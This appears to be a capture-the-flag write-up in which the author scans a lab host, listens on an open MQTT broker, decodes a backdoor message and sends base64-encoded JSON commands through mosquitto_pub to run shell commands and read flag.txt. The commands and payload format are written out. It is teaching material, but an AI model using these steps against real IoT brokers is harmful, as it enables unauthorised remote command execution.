First thing I did was nmap

<img width="566" height="263" alt="image" src="https://github.com/user-attachments/assets/2d7ab4b7-52f7-46a1-8de8-3ba40797f242" />

and we can see we have an ssh open and port 1883, running mosquitto.

So then I subbed to the mosquitto channel with the wildcard # for all topics. 

$ mosquitto_sub -h 10.112.170.229 -p 1883 -t "#" -v 

All the data is IoT devices communicating, however one message stands out 

<img width="711" height="402" alt="image" src="https://github.com/user-attachments/assets/85df141d-1408-4c10-9d5f-77f5abaf4cab" />

It looks like base64 so i took it to the Burp Decoder and got this result

<img width="1414" height="181" alt="image" src="https://github.com/user-attachments/assets/0aad52e5-d57c-4bc8-ac57-faaba58db8f9" />

We can see that we can run commands through this device, so i tried that. 
The command:
$ mosquitto_pub -h 10.112.170.229 -p 1883 -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub -m "HELP"

Gave this response:
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "HELP"}
S���P������i��O�y���!���� {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}

telling us the message format, so I rewrote my command in that format:
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "whoami"}

And the command must be base64 encoded so I did that too. 

<img width="942" height="60" alt="image" src="https://github.com/user-attachments/assets/cefc6a08-6318-49dd-9983-c318d9f35599" />

Giving response:

<img width="964" height="230" alt="image" src="https://github.com/user-attachments/assets/3875748c-827b-48b1-a718-e559ab516600" />

So we can see that the whoami command successfully ran.

Now I tried to search the system for any useful files. 

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls -la"}

Responded with: 

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"total 32\ndrwxr-xr-x 1 challenge challenge 4096 Mar 22  2022 .\ndrwxr-xr-x 1 root      root      4096 Mar 22  2022 ..\n-rw------- 1 challenge challenge   28 Mar 22  2022 .bash_history\n-rw-r--r-- 1 challenge challenge  220 Aug  4  2021 .bash_logout\n-rw-r--r-- 1 challenge challenge 3526 Aug  4  2021 .bashrc\n-rw-r--r-- 1 challenge challenge  807 Aug  4  2021 .profile\n-rw-r--r-- 1 root      root        39 Mar 21  2022 flag.txt\n"}

Where we can see a file named flag.txt so i tried to read this file.

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}

<img width="949" height="73" alt="image" src="https://github.com/user-attachments/assets/0fc09b2e-dfd7-43ae-bf4d-1771f66715f3" />

<img width="961" height="183" alt="image" src="https://github.com/user-attachments/assets/54a7d5ea-1c01-473b-ba09-510ab0359b69" />

Decoding the response

<img width="1078" height="218" alt="image" src="https://github.com/user-attachments/assets/8d250684-2e51-4c8e-891e-1d9addabe991" />

and I successfully grabbed the flag. 
